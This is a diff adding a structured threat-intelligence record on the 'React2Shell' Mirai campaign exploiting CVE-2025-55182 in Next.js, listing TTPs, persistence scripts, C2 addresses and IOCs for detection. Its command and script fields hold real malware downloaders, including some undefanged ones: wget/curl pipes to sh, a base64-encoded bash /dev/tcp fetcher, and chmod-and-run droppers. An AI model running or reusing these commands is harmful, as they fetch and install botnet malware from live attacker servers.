@@ -1,0 +1,229 @@
+title: 'React2Shell (CVE-2025-55182): Dissecting a Node.js RCE Against a Production
+  Next.js App'
+description: A multi-stage Mirai botnet campaign dubbed "React2Shell" targeted containerized
+  environments using wget/curl-based downloaders, a base64-encoded custom bash HTTP
+  client, and a multi-script persistence mechanism involving keepalive and watchdog
+  scripts communicating with four distinct C2 servers.
+attribution: ''
+malware_families:
+- Mirai
+cves:
+- CVE-2025-55182
+ttps:
+  processes:
+  - node
+  - wget
+  - curl
+  - bash
+  - sh
+  - nohup
+  - sudo
+  - spawnSync
+  - busybox
+  command_lines:
+  - cd /dev && busybox wget http://193.34.213[.]150/nuts/x86 && chmod 777 x86 && ./x86
+    reactOnMynuts
+  - busybox wget -q http://193.34.213[.]150/nuts/bolts -O-|sh
+  - wget -O - http://128.199.194[.]97:9001/setup2.sh|sh
+  - curl http://128.199.194[.]97:9001/setup2.sh | bash
+  - echo IyEvYmluL2Jhc2gKZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8JChlY2hvICR7MS8vLy8gfSkKICBET0M9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqfQogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCgogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJHRVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmUgJiYgY2F0KSA8JjMKICBleGVjIDM+Ji0KfQoKX19jdXJsIGh0dHA6Ly83OC4xNTMuMTQwLjE2L3JlLnNofGJhc2gK|base64
+    -d|bash
+  - /bin/sh
+  - cd /tmp
+  - wget http://176.117.107[.]154/bot
+  - chmod 777 bot
+  - ./bot
+  - curl -O http://176.117.107[.]154/bot
+  - cd /dev
+  - busybox wget http://193.34.213[.]150/nuts/x86
+  - chmod 777 x86
+  - ./x86 reactOnMynuts
+  - wget -O - http://128.199.194.97:9001/setup2.sh|sh
+  - curl http://128.199.194.97:9001/setup2.sh | bash
+  - echo IyEvYmluL2Jhc2gKZnVuY3Rpb24gX19jdXJs...|base64 -d|bash
+  - echo IyEvYmluL2Jhc2gKZnVuY3Rpb24gX19jdXJsKCkgewogIHJlYWQgcHJvdG8gc2VydmVyIHBhdGggPDw8JChlY2hvICR7MS8vLy8gfSkKICBET00
+    9LyR7cGF0aC8vIC8vfQogIEhPU1Q9JHtzZXJ2ZXIvLzoqfQogIFBPUlQ9JHtzZXJ2ZXIvLyo6fQogIFtbIHgiJHtIT1NUfSIgPT0geCIke1BPUlR9IiBdXSAmJiBQT1JUPTgwCgogIGV4ZWMgMzw+L2Rldi90Y3AvJHtIT1NUfS8kUE9SVAogIGVjaG8gLWVuICJHRVQgJHtET0N9IEhUVFAvMS4wXHJcbkhvc3Q6ICR7SE9TVH1cclxuXHJcbiIgPiYzCiAgKHdoaWxlIHJlYWQgbGluZTsgZG8KICAgW1sgIiRsaW5lIiA9PSAkJ1xyJyBdXSAmJiBicmVhawogIGRvbmUgJiYgY2F0KSA8JjMKICBleGVjIDM+Ji0KfQoKX19jdXJsIGh0dHA6Ly83OC4xNTMuMTQwLjE2L3JlLnNofGJhc2gK|base64-d|bash
+  powershell: []
+  scripts:
+  - '#!/bin/sh
+
+    cd /tmp
+
+    wget http://176.117.107[.]154/bot
+
+    chmod 777 bot
+
+    ./bot
+
+    cd /tmp
+
+    curl -O http://176.117.107[.]154/bot
+
+    chmod 777 bot
+
+    ./bot'
+  - '#!/bin/sh
+
+    (
+
+    cd /dev
+
+    busybox wget http://193.34.213[.]150/nuts/x86
+
+    chmod 777 x86
+
+    ./x86 reactOnMynuts
+
+    busybox wget -q http://193.34.213[.]150/nuts/bolts -O-|sh)'
+  - "#!/bin/bash\nfunction __curl() {\n  read proto server path <<<$(echo ${1////\
+    \ })\n  DOC=/${path// //}\n  HOST=${server//:*}\n  PORT=${server//*:}\n  [[ x\"\
+    ${HOST}\" == x\"${PORT}\" ]] && PORT=80\n  exec 3<>/dev/tcp/${HOST}/$PORT\n  echo\
+    \ -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3\n  (while read\
+    \ line; do\n   [[ \"$line\" == $'\\r' ]] && break\n  done && cat) <&3\n  exec\
+    \ 3>&-\n}\n__curl http://78.153.140.16/re.sh|bash"
+  - setup2.sh
+  - lived.sh
+  - alive.sh
+  - /dev/health.sh
+  - re.sh
+  - bolts
+  - "#!/bin/bash\nfunction __curl() {\n  read proto server path <<<$(echo ${1////\
+    \ })\n  DOC=/${path// //}\n  HOST=${server//:*}\n  PORT=${server//*:}\n  [[ x\"\
+    ${HOST}\" == x\"${PORT}\" ]] && PORT=80\n  exec 3<>/dev/tcp/${HOST}/$PORT\n  echo\
+    \ -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3\n  (while read\
+    \ line; do\n   [[ \"$line\" == $'\\r' ]] && break\n  done && cat) <&3\n  exec\
+    \ 3>&-\n}\n__curl http://78.153.140[.]16/re.sh|bash"
+  - __curl http://78.153.140.16/re.sh|bash
+  - exec 3<>/dev/tcp/${HOST}/$PORT
+  - 'echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3'
+  - wget -O - http://128.199.194.97:9001/setup2.sh|sh
+  - curl http://128.199.194.97:9001/setup2.sh | bash
+  - mkdir -p /tmp/runnv/
+  - '#!/bin/sh
+
+    (cd /dev
+
+    busybox wget http://193.34.213[.]150/nuts/x86
+
+    chmod 777 x86
+
+    ./x86 reactOnMynutz
+
+    busybox wget -q http://193.34.213[.]150/nuts/bolts -O-|sh)'
+  - "#!/bin/bash\nfunction __curl() {\n  read proto server path <<<$(echo ${1////\
+    \ })\n  DOM=/${path// //}\n  HOST=${server//:*}\n  PORT=${server//*:}\n  [[ x\"\
+    ${HOST}\" == x\"${PORT}\" ]] && PORT=80\n  exec 3<>/dev/tcp/${HOST}/$PORT\n  echo\
+    \ -en \"GET ${DOC} HTTP/1.0\\r\\nHost: ${HOST}\\r\\n\\r\\n\" >&3\n  (while read\
+    \ line; do\n   [[  \"$line\" == $'\\r' ]] && break\n  done && cat) <&3\n  exec\
+    \ 3>&-\n}\n__curl http://78.153.140[.]16/re.sh|bash"
+  - '#!/bin/sh
+
+    wget -O - http://128.199.194[.]97:9001/setup2.sh|sh
+
+    curl http://128.199.194[.]97:9001/setup2.sh | bash'
+  - /tmp/runnv/lived.sh
+  - /tmp/runnv/alive.sh
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - wget -> 176.117.107[.]154:80
+  - busybox wget -> 193.34.213[.]150:80
+  - shell -> 128.199.194[.]97:9001
+  - shell -> 78.153.140[.]16
+  - wget -> 128.199.194[.]97:9001
+  - curl -> 128.199.194[.]97:9001
+  - bash -> 78.153.140[.]16:80
+  - bash -> 193.34.213[.]150
+  - wget -> 193.34.213[.]150:80
+  - wget -> 78.153.140[.]16:80
+  - bash /dev/tcp -> 78.153.140[.]16:80
+  - wget -> 128.199.194[.]97
+  - wget -> 128.199.194.97:9001
+  - curl -> 128.199.194.97:9001
+  - bash -> 78.153.140.16:80
+  - bash -> 193.34.213.150:80
+  - bash -> 176.117.107.154:80
+  - curl -> 176.117.107[.]154:80
+  - busybox -> 193.34.213[.]150:80
+  - wget/curl/busybox -> 176.117.107[.]154:80
+  - wget/curl/busybox -> 193.34.213[.]150:80
+  - wget/curl/busybox -> 128.199.194[.]97:9001
+  - wget/curl/busybox -> 78.153.140[.]16:80
+  file_activity:
+  - /tmp/bot
+  - /dev/x86
+  - /dev/health.sh
+  - /tmp/runnv/lived.sh
+  - /tmp/runnv/alive.sh
+  - /app/logs/app.log
+  - setup2.sh
+  - bolts
+  persistence:
+  - Keepalive/persistence scripts deployed via C2 server at 128.199.194[.]97:9001
+  - Malware written to /dev directory to evade monitoring and survive container restarts
+  - /dev/health.sh created as persistence script (produced syntax error during execution)
+  - setup2.sh dropper creates /tmp/runnv/ directory and downloads lived.sh and alive.sh,
+    launching both via nohup for background execution
+  - lived.sh keepalive daemon periodically checks in with C2 and re-downloads main
+    payload if removed
+  - alive.sh watchdog monitors lived.sh and restarts it if terminated
+  - Nine consecutive sudo privilege escalation attempts to install system-level persistence
+    (all failed with sudo not found)
+  - nohup execution of lived.sh keepalive daemon
+  - nohup execution of alive.sh watchdog process
+  - setup2.sh primary persistence dropper distributed from 128.199.194[.]97:9001
+  - Keepalive scripts installed on target system (Stage 5, C2 128.199.194[.]97)
+  - Malware written to /dev directory to evade monitoring and persist through container
+    restarts
+  - Dropper script setup2.sh creates /tmp/runnv/ directory and downloads lived.sh
+    and alive.sh, launching both via nohup for background execution
+  - lived.sh functions as a keepalive daemon that periodically checks in with C2 and
+    re-downloads main payload if removed
+  - alive.sh operates as a watchdog process that monitors lived.sh and restarts it
+    if terminated
+  - Nine consecutive attempts to use sudo for system-level persistence (cron jobs,
+    systemd services, or init scripts) - all failed with sudo not found
+  - nohup execution of /tmp/runnv/lived.sh as keepalive daemon
+  - nohup execution of /tmp/runnv/alive.sh as watchdog process
+  - Boot/logon init script execution via lived.sh and alive.sh (T1037)
+  - sudo privilege escalation attempts for system persistence (9 failed attempts)
+  - nohup execution of /tmp/runnv/lived.sh keepalive persistence daemon
+  - nohup execution of /tmp/runnv/alive.sh watchdog persistence process
+  - Boot/Logon Init Scripts (T1037) via lived.sh and alive.sh
+  process_relations:
+  - Node.js RSC handler -> child_process.spawnSync(/bin/sh)
+  - sh -> wget
+  - sh -> curl
+  - sh -> nohup
+  - sh -> sudo
+  - bash -> __curl http://78.153.140[.]16/re.sh
+  - RSC Flight protocol parser -> child_process.spawnSync()
+  - child_process.spawnSync() -> /bin/sh
+  - node -> /bin/sh
+  - bash -> sh
+  - sh -> busybox
+  - bash -> /dev/tcp
+iocs:
+  hashes: []
+  ip_addresses:
+  - 193.34.213[.]150
+  - 176.117.107[.]154
+  - 128.199.194[.]97
+  - 78.153.140[.]16
+  - 193.34.213[.]152
+  - 193.34.213[.]153
+  - 193.34.213[.]157
+  - 193.34.213[.]159
+  domains: []
+  urls:
+  - hxxp://176.117.107[.]154/bot
+  - hxxp://193.34.213[.]150/nuts/x86
+  - hxxp://193.34.213[.]150/nuts/bolts
+  - hxxp://128.199.194[.]97:9001/setup2.sh
+  - hxxp://78.153.140[.]16/re.sh
+  - hxxp://193.34.213[.]150/nuts/
+  - hxxp://193.34.213[.]150/nuts
+authors: []
+reference: https://hunt.io/blog/react2shell-cve-2025-55182-nextjs-nodejs-rce
+date_of_publication: December 10, 2025
+file_creation_date: June 17, 2026
